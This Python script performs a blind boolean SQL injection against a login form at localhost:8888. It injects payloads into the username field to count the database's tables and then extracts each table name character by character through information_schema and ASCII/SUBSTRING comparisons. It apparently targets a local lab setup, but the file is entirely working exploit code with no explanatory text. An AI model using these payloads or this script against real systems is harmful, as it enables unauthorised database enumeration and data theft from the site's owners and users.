import requests


def getNumberOfTables():

    payload = {
        "username": "",
        "password": ""
    }
    status = ""
    numberOfTables = 0

    while(status != "Success"):
        payload["username"] = "' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = {}-- ".format(
            numberOfTables)
        r = requests.post("http://localhost:8888/", data=payload)
        status = r.content.decode("utf-8")
        numberOfTables += 1

    print("Number of tables: " + str(numberOfTables - 1))


def getNamesOfTables(numberOfTables):

    payload = {
        "username": "",
        "password": ""
    }

    for i in range(numberOfTables):
        length = 1
        name = ""
        status = ""

        while(status != "Success"):
            payload["username"] = "' OR (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT {},1) = {}-- ".format(i, length)
            r = requests.post("http://localhost:8888/", data=payload)
            status = r.content.decode("utf-8")
            length += 1
        length -= 1

        for j in range(length):
            numberOfAsciiCharacters = 128

            for k in range(numberOfAsciiCharacters):
                payload["username"] = "' OR (SELECT ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT {}, 1), {}, 1))) = {}-- ".format(i, j + 1, k)
                r = requests.post("http://localhost:8888/", data=payload)
                status = r.content.decode("utf-8")

                if(status == "Success"):
                    character = chr(k)
                    name = name + character
                    break

        print("Name of table: " + name)
